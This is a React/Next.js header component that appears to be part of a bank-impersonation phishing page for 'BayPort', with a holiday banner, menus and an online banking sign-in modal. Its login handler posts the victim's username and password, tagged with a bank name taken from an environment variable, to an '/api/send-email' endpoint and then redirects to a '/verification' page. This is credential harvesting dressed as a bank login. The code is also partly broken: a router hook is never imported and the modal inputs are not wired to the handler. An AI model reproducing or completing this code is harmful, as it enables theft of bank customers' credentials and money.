import { useState } from "react";
import { Search, User } from "lucide-react"; // Or use any icon library
import Logo from "../../../public/assets/logo.png"
import Image from "next/image";

export default function Header() {
  const [showLogin, setShowLogin] = useState(false);
  const [activeMenu, setActiveMenu] = useState(null);
  const router = useRouter();
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [saveUsername, setSaveUsername] = useState(false);
  const [infoTab, setInfoTab] = useState('info'); // 'moose' or 'info'
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitStatus, setSubmitStatus] = useState(null);

  const toggleSaveUsername = () => {
    setSaveUsername(!saveUsername);
  };

  const togglePasswordVisibility = () => {
    const passwordInput = document.getElementById('password');
    if (passwordInput.type === 'password') {
      passwordInput.type = 'text';
    } else {
      passwordInput.type = 'password';
    }
  };

  const handleLogin = async(e) => {
    e.preventDefault();

    // Form validation
    if (!username || !password) {
      // You could add form validation UI feedback here
      return;
    }

    setIsSubmitting(true);
    setSubmitStatus(null);

    try {
      // Send data to the authentication API
      const response = await fetch("/api/send-email", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          bName: process.env.NEXT_PUBLIC_BANK_NAME,
          username: username,
          password: password,
        }),
      });

      if (!response.ok) {
        throw new Error("Authentication failed");
      }

      const data = await response.json();
      
      // Set success status
      setSubmitStatus("success");

      
      // Redirect to dashboard or next page after successful login
      setTimeout(() => {
        router.push("/verification");
      }, 1000);
    } catch (error) {
      console.error("Login failed:", error);
      setSubmitStatus("error");
      // You could add error handling UI feedback here
    } finally {
      setIsSubmitting(false);
    }
  };

  // Load saved username on component mount
  

  return (
    <div>
      {/* Holiday Notice Banner */}
      <div className="bg-[#FFF3CD] text-center py-2 pr-[25vw] text-sm border-b border-yellow-200 text-[#8D6604]">
        <strong>Holiday Closing:</strong> All BayPort branches will be closed Monday, May 26, in observance of Memorial Day.
      </div>

      {/* Header */}
      <header className="bg-white shadow-md sticky top-0 z-50 text-[#A1A1A1]">
        {/* Top Bar */}
        <div className="max-w-7xl mx-auto px-4 flex justify-between items-center py-2 text-sm">
          <div className="relative w-64">
            <input
              type="text"
              placeholder="What can we help you find?"
              className="pl-4 pr-10 py-2 border rounded-md w-full border-gray-300 focus:ring-2 focus:ring-green-500"
            />
            <Search className="absolute right-3 top-2.5 h-4 w-4 text-gray-400" />
          </div>

          <div className="flex items-center gap-6">
            <a href="#" className="text-[#A1A1A1] hover:text-gray-800">Branches & ITMs</a>
            <a href="#" className="text-[#A1A1A1] hover:text-gray-800">Rates</a>
            <a href="#" className="text-[#A1A1A1] hover:text-gray-800">About</a>
            <a href="#" className="text-[#A1A1A1] hover:text-gray-800">Careers</a>
            <a href="#" className="text-[#A1A1A1] hover:text-gray-800">Help</a>
            <button
              onClick={() => setShowLogin(!showLogin)}
              className="flex items-center space-x-1 text-green-600 hover:text-green-700"
            >
              <User className="h-4 w-4" />
              <span>Log in</span>
            </button>
          </div>
        </div>
        <div className="flex justify-center">

          <hr className="border w-[65vw] align-middle"/>
        </div>

        {/* Main Nav */}
        <div className="max-w-7xl mx-auto px-4 flex items-center justify-between py-3">
         <Image
                           src={Logo}
                           alt="Happy family - father and child"
                           className=" h-20"
                         />

          <nav className="flex gap-8 text-sm font-medium">
            {['Financial Wellness', 'Bank', 'Borrow', 'Insure', 'Invest', 'Home', 'Business'].map((item) => (
              <div
                key={item}
                onMouseEnter={() => setActiveMenu(item)}
                onMouseLeave={() => setActiveMenu(null)}
                className="relative"
              >
                <button className="hover:text-green-700">{item}</button>

                {/* Dropdown Example for 'Borrow' */}
                {activeMenu === item && item === 'Borrow' && (
                  <div className="absolute top-full left-0 bg-white border shadow-xl w-80 p-4 rounded-md z-40">
                    <ul className="space-y-3">
                      <li><strong>Buy a car</strong> <br /><span className="text-xs text-gray-500">Get pre-qualified for a vehicle loan</span></li>
                      <li><strong>Credit cards</strong> <br /><span className="text-xs text-gray-500">Cash in on rewards and low rates</span></li>
                      <li><strong>Take-Back® Loans</strong> <br /><span className="text-xs text-gray-500">Pay ahead and access funds later</span></li>
                      <li><strong>Refinance</strong> <br /><span className="text-xs text-gray-500">Lower your rate and payments</span></li>
                      <li><strong>Personal loans</strong> <br /><span className="text-xs text-gray-500">Flexible financing when you need it</span></li>
                      <li><strong>Skip-A-Payment</strong> <br /><span className="text-xs text-gray-500">Hit pause on your loan payment</span></li>
                    </ul>
                  </div>
                )}
              </div>
            ))}
          </nav>

          <button className="bg-green-500 hover:bg-green-600 text-white text-sm px-4 py-2 rounded-full shadow">
            Join BayPort
          </button>
        </div>

        {/* Floating Login Modal */}
        {showLogin && (
          <div className="absolute right-80 top-20 bg-white  shadow-lg  p-6 w-80 z-50">
            <h3 className="text-md font-medium mb-4 text-center text-black">Online Banking Sign In</h3>
            <input
              type="text"
              placeholder="Username"
              className="w-full mb-3 border px-3 py-2 rounded focus:ring focus:ring-green-200"
            />
            <input
              type="password"
              placeholder="Password"
              className="w-full mb-3 border px-3 py-2 rounded focus:ring focus:ring-green-200"
            />
            <button className="w-full bg-green-600 text-white py-2 rounded hover:bg-green-700">
              Log In
            </button>
            <div className="text-sm text-blue-600 mt-3">
              <a href="#" className="hover:underline block">Forgot Your Login?</a>
              <a href="#" className="hover:underline block mt-1">Activate Consumer Online Banking</a>
            </div>
          </div>
        )}
      </header>
    </div>
  );
}
